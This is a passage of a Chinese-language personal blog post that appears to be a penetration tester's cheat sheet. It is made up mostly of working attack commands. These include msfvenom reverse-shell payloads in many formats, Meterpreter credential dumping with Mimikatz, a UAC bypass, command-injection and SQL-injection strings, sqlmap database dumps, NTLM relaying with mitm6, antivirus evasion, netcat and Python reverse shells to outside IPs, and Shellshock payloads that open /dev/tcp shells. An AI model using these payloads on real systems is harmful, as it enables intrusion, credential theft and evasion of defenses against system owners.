+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload linux/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+
+<h3 id="msf备忘"><a href="#msf备忘" class="headerlink" title="msf备忘"></a>msf备忘</h3><p>上传文件</p>
+<p><code>upload file c:\\windows</code></p>
+<p>下载文件</p>
+<p><code>download c:\\windows\\repair\\sam /tmp</code></p>
+<p>运行exe</p>
+<p><code>execute -f c:\\windows\temp\exploit.exe</code></p>
+<p>使用cmd shell创建新通道</p>
+<p><code>execute -f cmd -c</code></p>
+<p>端口转发</p>
+<p><code>portfwd add –l 3389 –p 3389 –r target</code></p>
+<p>关闭端口转发</p>
+<p><code>portfwd delete –l 3389 –p 3389 –r target</code></p>
+<p>Bypass UAC</p>
+<p><code>use exploit/windows/local/bypassuac</code></p>
+<p>HTTP目录扫描</p>
+<p><code>use auxiliary/scanner/http/dir_scanner</code></p>
+<p>扫描JBOSS漏洞</p>
+<p><code>use auxiliary/scanner/http/jboss_vulnscan</code></p>
+<p>扫描MSSQL密码</p>
+<p><code>use auxiliary/scanner/mssql/mssql_login</code></p>
+<p>扫描MSSQL版本</p>
+<p><code>use auxiliary/scanner/mysql/mysql_version</code></p>
+<p>Oracle登录模块</p>
+<p><code>use auxiliary/scanner/oracle/oracle_login</code></p>
+<p>powershell有效负载模块</p>
+<p><code>use exploit/multi/script/web_delivery</code></p>
+<p>通过会话上传和运行powershell脚本</p>
+<p><code>post/windows/manage/powershell/exec_powershell</code></p>
+<p>部署JBOSS</p>
+<p><code>use exploit/multi/http/jboss_maindeployer</code></p>
+<p>MSSQL有效负载</p>
+<p><code>use exploit/windows/mssql/mssql_payload</code></p>
+<p>显示当前用户的权限</p>
+<p><code>run post/windows/gather/win_privs</code></p>
+<p>抓取GPP保存的密码</p>
+<p><code>use post/windows/gather/credentials/gpp</code></p>
+<p>加载Mimikatz/kiwi并获得凭证</p>
+<p><code>load kiwi</code></p>
+<p><code>creds_all</code></p>
+<p>识别所提供的域用户具有管理访问权限的其他计算机</p>
+<p><code>run post/windows/gather/local_admin_search_enum</code></p>
+<p><code>set AUTORUNSCRIPT post/windows/manage/migrate</code></p>
+<h3 id="msf-payloads"><a href="#msf-payloads" class="headerlink" title="msf payloads"></a>msf payloads</h3><p>列出选项</p>
+<p><code>msfvenom –l</code></p>
+<h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho<br></code></pre></td></tr></table></figure>
+
+<h3 id="Web-payloads"><a href="#Web-payloads" class="headerlink" title="Web payloads"></a>Web payloads</h3><p>PHP</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw &gt; shell.php<br><br>cat shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+
+<p>ASP</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure>
+
+<p>JSP</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp<br></code></pre></td></tr></table></figure>
+
+<p>WAR</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war<br></code></pre></td></tr></table></figure>
+
+<h3 id="脚本-payloads"><a href="#脚本-payloads" class="headerlink" title="脚本 payloads"></a>脚本 payloads</h3><p>Python</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py<br></code></pre></td></tr></table></figure>
+
+<p>Bash</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh<br></code></pre></td></tr></table></figure>
+
+<p>Perl</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl<br></code></pre></td></tr></table></figure>
+
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f<br></code></pre></td></tr></table></figure>
+
+<h3 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h3><p>msf常用</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/multi/handler<br><br><span class="hljs-built_in">set</span> PAYLOAD<br><br><span class="hljs-built_in">set</span> LHOST<br><br><span class="hljs-built_in">set</span> LPORT<br><br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br><br>exploit -j -z<br></code></pre></td></tr></table></figure>
+<p><strong>Demo</strong></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f &gt; exploit.extension<br></code></pre></td></tr></table></figure>
+
+<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a><center>Powershell</center></h2><p>执行旁路</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Set-ExecutionPolicy Unrestricted<br>./file.ps1<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module script.psm1<br>Invoke-FunctionThatIsIntheModule<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)<br></code></pre></td></tr></table></figure>
+<p>Powershell.exe被阻止</p>
+<p>Use ‘not powershell’ <a href="https://github.com/Ben0xA/nps" target="_blank" rel="noopener">https://github.com/Ben0xA/nps</a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a><center>提权</center></h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
+<p><a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/unix-privesc-check</a></p>
+<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p><a href="https://github.com/pentestmonkey/windows-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/windows-privesc-check</a></p>
+<p><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
+<p><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" target="_blank" rel="noopener">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></p>
+<h2 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a><center>命令行注入</center></h2><h3 id="遍历文件"><a href="#遍历文件" class="headerlink" title="遍历文件"></a>遍历文件</h3><p><code>website.com/file.php[?path=/]</code></p>
+<h3 id="使用curl探测HTTP-options"><a href="#使用curl探测HTTP-options" class="headerlink" title="使用curl探测HTTP options"></a>使用curl探测HTTP options</h3><p><code>curl -vX OPTIONS [website]</code></p>
+<h3 id="使用CURL将文件上传到具有PUT方法的网站"><a href="#使用CURL将文件上传到具有PUT方法的网站" class="headerlink" title="使用CURL将文件上传到具有PUT方法的网站"></a>使用CURL将文件上传到具有PUT方法的网站</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --upload-file shell.php --url http://192.168.218.139/<span class="hljs-built_in">test</span>/shell.php --http1.0<br></code></pre></td></tr></table></figure>
+<h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?path=/;wget http://IPADDRESS:8000/FILENAME.EXTENTION;<br></code></pre></td></tr></table></figure>
+
+<h3 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;php -f filelocation.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><center>SQL注入</center></h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>登录表单的常见注入:</p>
+<ul>
+<li>admin’ –</li>
+<li>admin’ #</li>
+<li>admin’/*</li>
+<li>‘ or 1=1–</li>
+<li>‘ or 1=1#</li>
+<li>‘ or 1=1/*</li>
+<li>‘) or ‘1’=’1–</li>
+<li>‘) or (‘1’=’1—</li>
+</ul>
+<h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p>自动sqlmap扫描</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://demo.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3<br></code></pre></td></tr></table></figure>
+
+<p>有针对性的sqlmap扫描</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=<span class="hljs-string">"/var/www/blah.php"</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">"http://meh.com/meh.php?id=1"</span> --dbms=mysql --tech=U --random-agent --dump Scan url <span class="hljs-keyword">for</span> union + error based injection with mysql backend and use a random user agent + database dump<br></code></pre></td></tr></table></figure>
+
+<p>sqlmap检查表单注入</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">"http://meh.com/form/"</span> –forms<br></code></pre></td></tr></table></figure>
+
+<p>dump数据库</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">"http://meh/vuln-form"</span> --forms -D database-name -T users –dump<br></code></pre></td></tr></table></figure>
+
+<p>刷新会话</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap --flush session<br></code></pre></td></tr></table></figure>
+
+<p>尝试使用布尔技术来利用“用户”字段。</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -p user --technique=B<br></code></pre></td></tr></table></figure>
+
+<p>Post</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r demo.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>使用mitm6的NTLMRelayx.py</p>
+<p>使用mitm6通过IPv6欺骗获取捕获的凭据，并通过ntlmrelayx.py将其转发到目标。它需要安装ntlmrelayx.py和mitm6。</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitm6 -d &lt;domain.local&gt;<br><br>ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/<br></code></pre></td></tr></table></figure>
+
+<h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>sshuttle是一个很棒的隧道工具，它摆脱了对代理链的需求。以下命令的作用是通过10.0.0.1隧道传输流量，并为通过sshuttle隧道发往10.10.10.0/24的所有流量建立路由。</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sshuttle -r root@10.0.0.1 10.10.10.0/24<br></code></pre></td></tr></table></figure>
+
+<h3 id="AV-Bypass"><a href="#AV-Bypass" class="headerlink" title="AV Bypass"></a>AV Bypass</h3><p>需要安装wine和hyperion。</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe<br></code></pre></td></tr></table></figure>
+<h3 id="Web主机（传输文件）"><a href="#Web主机（传输文件）" class="headerlink" title="Web主机（传输文件）"></a>Web主机（传输文件）</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m SimpleHTTPServer 80<br></code></pre></td></tr></table></figure>
+
+<h3 id="PHP-msf-shell"><a href="#PHP-msf-shell" class="headerlink" title="PHP msf shell"></a>PHP msf shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 R &gt; phpmeterpreter.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="Netcat-1"><a href="#Netcat-1" class="headerlink" title="Netcat"></a>Netcat</h3><p>监听</p>
+<p>nc -lvp <PORT></PORT></p>
+<p>反弹</p>
+<p>nc -e /bin/bash ip port</p>
+<p>ncat -v -l -p 7777 -e /bin/bash</p>
+<p>通过ncat下载文件</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat happy.txt | ncat -v -l -p 5555 <br>ncat localhost 5555 &gt; happy_copy.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="使用解释器反弹shell"><a href="#使用解释器反弹shell" class="headerlink" title="使用解释器反弹shell"></a>使用解释器反弹shell</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<p>Python</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Shellshock"><a href="#Shellshock" class="headerlink" title="Shellshock"></a>Shellshock</h3><p>CURL</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x TARGETADDRESS -H <span class="hljs-string">"User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/HOSTIP/1234 0&gt;&amp;1"</span> TARGETADDRESS/cgi-bin/status<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x 192.168.28.167:PORT -H <span class="hljs-string">"User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.28.169/1234 0&gt;&amp;1"</span> 192.168.28.167/cgi-bin/status<br></code></pre></td></tr></table></figure>
+
+<p>SSH</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IPADDRESS <span class="hljs-string">'() &#123; :;&#125;; /bin/bash'</span><br></code></pre></td></tr></table></figure>
+    </main>
+    <div class="copy">
+      
+        
+  <br/>
+  <div style="text-align:center;color:#ccc;font-size:14px;">
+    ------ 本文结束 ------
+  </div>
+  <br/>
+  <div class="my_post_copyright" style="border:1px solid black;background-color:#f9f9f9">
+  	<div style="margin-left:24px">
+  	  <script src="https:////cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  	  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  	  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  	  <p><span>本文标题:</span><a href="/posts/554d428f.html">小本本--备忘录</a></p>
+  	  <p><span>文章作者:</span><a href="/" title="访问 Kuiba 的个人博客">Kuiba</a></p>
+  	  <p><span>发布时间:</span>2019年02月09日 - 17:02</p>
+  	  <!--<p><span>最后更新:</span>2019年05月27日 - 17:05</p>-->
+  	  <p><span>原始链接:</span><a href="/posts/554d428f.html" title="小本本--备忘录">https://kuibarj.top/posts/554d428f.html</a>
+  	    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kuibarj.top/posts/554d428f.html"  aria-label="复制成功！"></i></span>
+  	  </p>
+  	  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">Attribution-NonCommercial-NoDerivatives 4.0</a> 转载请保留原文链接及作者。</p>  
+  	</div>
+  </div>
+  <br/>
+  <script> 
+      var clipboard = new Clipboard('.fa-clipboard');
+        $(".fa-clipboard").click(function(){
+        clipboard.on('success', function(){
+          swal({   
+            title: "",   
+            text: '复制成功',
+            icon: "success", 
+            showConfirmButton: true
+            });
+          });
+      });  
+  </script>
+
+      
+    </div>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" rel="tag"><i class="fas fa-tags"></i>备忘录</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/posts/1de3639b.html" rel="prev" title="Jboss反序列化漏洞(CVE-2017-12149)"><i class="fas fa-angle-left"></i><span class="nav-title">Jboss反序列化漏洞(CVE-2017-12149)</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/posts/8e5dfaea.html" rel="next" title="HackTehBox-SecNotes"><span class="nav-title">HackTehBox-SecNotes</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/avatar.jpg" alt="Kuiba">
+  
+  <h1 class="author-name">Kuiba</h1>
+  <h2 class="author-description">这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。</h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">37</a></div>
+    </div>
+    
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">36</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#枚举"><span class="toc-text">枚举</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#常规枚举"><span class="toc-text">常规枚举</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#FTP-21"><span class="toc-text">FTP (21)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SSH-22"><span class="toc-text">SSH (22)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SMTP-25"><span class="toc-text">SMTP (25)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Web-80-443"><span class="toc-text">Web (80&#x2F;443)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Pop3-110"><span class="toc-text">Pop3 (110)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#RPCBind-111"><span class="toc-text">RPCBind (111)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SMB-RPC-139-445"><span class="toc-text">SMB\RPC (139&#x2F;445)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SNMP-161"><span class="toc-text">SNMP (161)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Oracle-1521"><span class="toc-text">Oracle (1521)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Mysql-3306"><span class="toc-text">Mysql (3306)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#DNS区域传输"><span class="toc-text">DNS区域传输</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#挂载文件共享"><span class="toc-text">挂载文件共享</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#指纹识别"><span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#搜索利用exp"><span class="toc-text">搜索利用exp</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#编译EXP"><span class="toc-text">编译EXP</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#检测数据包"><span class="toc-text">检测数据包</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#密码破解"><span class="toc-text">密码破解</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#暴力破解"><span class="toc-text">暴力破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Shells-amp-Reverse-Shells"><span class="toc-text">Shells &amp; Reverse Shells</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SUID-C-Shells"><span class="toc-text">SUID C Shells</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#TTY-Shell"><span class="toc-text">TTY Shell</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Spawn-Ruby-Shell"><span class="toc-text">Spawn Ruby Shell</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Netcat"><span class="toc-text">Netcat</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#telnet反弹Shell"><span class="toc-text">telnet反弹Shell</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#PHP"><span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Bash"><span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Meterpreter"><span class="toc-text">Meterpreter</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Windows-VNV"><span class="toc-text">Windows VNV</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#msf备忘"><span class="toc-text">msf备忘</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#msf-payloads"><span class="toc-text">msf payloads</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#二进制"><span class="toc-text">二进制</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Web-payloads"><span class="toc-text">Web payloads</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#脚本-payloads"><span class="toc-text">脚本 payloads</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Handlers"><span class="toc-text">Handlers</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Powershell"><span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#提权"><span class="toc-text">提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Linux-1"><span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Windows-1"><span class="toc-text">Windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#命令行注入"><span class="toc-text">命令行注入</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#遍历文件"><span class="toc-text">遍历文件</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#使用curl探测HTTP-options"><span class="toc-text">使用curl探测HTTP options</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#使用CURL将文件上传到具有PUT方法的网站"><span class="toc-text">使用CURL将文件上传到具有PUT方法的网站</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#传输文件"><span class="toc-text">传输文件</span></a></li><li 